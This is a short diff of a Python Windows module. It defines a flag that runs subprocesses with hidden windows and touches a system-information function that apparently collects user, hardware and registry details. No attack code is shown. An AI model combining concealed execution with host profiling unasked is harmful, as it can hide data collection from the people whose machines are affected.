@@ -6,15 +6,16 @@ from os import getlogin, makedirs, sep, environ
 from os.path import exists
 from time import asctime
 from requests import get
-from subprocess import check_output, PIPE,run
+from subprocess import check_output, PIPE, run, STARTUPINFO, STARTF_USESHOWWINDOW
 from wmi import WMI
 from winreg import OpenKey, HKEY_LOCAL_MACHINE, QueryValueEx
 from json import loads
 from uuid import UUID,getnode
 from manager.logger import Log
-from manager.manager import HIDDEN_WINDOW
 from preferences.config import config
 
+HIDDEN_WINDOW = STARTUPINFO()
+HIDDEN_WINDOW.dwFlags |= STARTF_USESHOWWINDOW
 logo = '''
 |-----------------------------------------------------------------------------|
 |       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       |
@@ -73,7 +74,7 @@ def get_size(bytes, suffix="B"):
             return f"{bytes:.2f} {unit}{suffix}"
         bytes /= factor
 
-def SystemInfo():
+def SystemInfo():    
     Log("===========System===========")
 
     user = uname()
